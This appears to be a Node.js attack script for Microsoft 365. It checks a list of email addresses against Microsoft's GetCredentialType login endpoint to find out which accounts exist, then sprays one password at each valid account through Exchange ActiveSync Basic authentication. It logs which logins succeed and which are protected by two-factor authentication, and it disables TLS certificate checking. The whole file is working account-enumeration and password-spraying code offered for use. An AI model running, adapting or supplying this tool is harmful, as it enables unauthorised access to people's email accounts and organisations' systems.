const fs = require('fs')
const request = require('request')
const lineReader = require('line-reader');
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

emails = []
start_index = 0
//temp value defined after parsing the file
end_index = 0
threads = 0
threads_limit = 10

var pass = process.argv[3]
var user_file = process.argv[2]

function is_email_valid(email){
  let bodyString = `{"Username":"${email}"}`
  
  let headers = {
      "Connection": "close", 
      "Accept-Encoding": "identity", 
      "Accept": "*/*", 
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", 
      "Content-Length": bodyString.length
  }
  
  let options = {
      url: "https://login.microsoftonline.com/common/GetCredentialType",
      headers: headers,
      method: "post",
      body: bodyString
  }
  request(options, function (error, response, body) {
    let email_status = JSON.parse(body).IfExistsResult
    if(email_status == 0){
      console.log(`[+] VALID_EMAIL: ${email}`)
      is_password_valid(email)
    }else{
      console.log(`[-] UNKNOWN_EMAIL: ${email}`)
      threads -= 1
      thread_api()
    }
  })
}

function is_password_valid(email){
  let userpass =  `${email}:${pass}` 
  let encoded = Buffer.from(userpass).toString('base64')
  let headers = {
      "Connection": "close", 
      "Accept-Encoding": "gzip, deflate", 
      "Accept": "*/*", 
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", 
      "MS-ASProtocolVersion": "14.0", 
      "Content-Length": "0", 
      "Authorization": `Basic ${encoded}`
  }
  
  let options = {
      url: "https://outlook.office365.com:443/Microsoft-Server-ActiveSync",
      headers: headers,
      method: "options"
  }
  request(options, function (error, response, body) {
    if(response.statusCode == 403){
      console.log(`[+] SUCCESS (But 2FA): ${email}:${pass}`)
    }else if(response.statusCode == 200){
      console.log(`[+] SUCCESS: ${email}:${pass}`)
    }else{
      console.log(`[-] fail: ${email}:${pass}`)
    }
    threads -= 1
    thread_api()
  })
}

function thread_api(){
  while((start_index <= end_index) && (threads <= threads_limit)){
    is_email_valid(emails[start_index])
    start_index += 1
    threads += 1
  }
}

if(process.argv[2].indexOf('@') !== -1){
  emails.push(process.argv[2])
  end_index = 0
  thread_api()
}else{
  emails = fs.readFileSync(process.argv[2], 'utf8').split('\n');
  emails = emails.filter(function (str) { return str.indexOf('@') !== -1; })
  end_index = emails.length - 1
  thread_api()
}
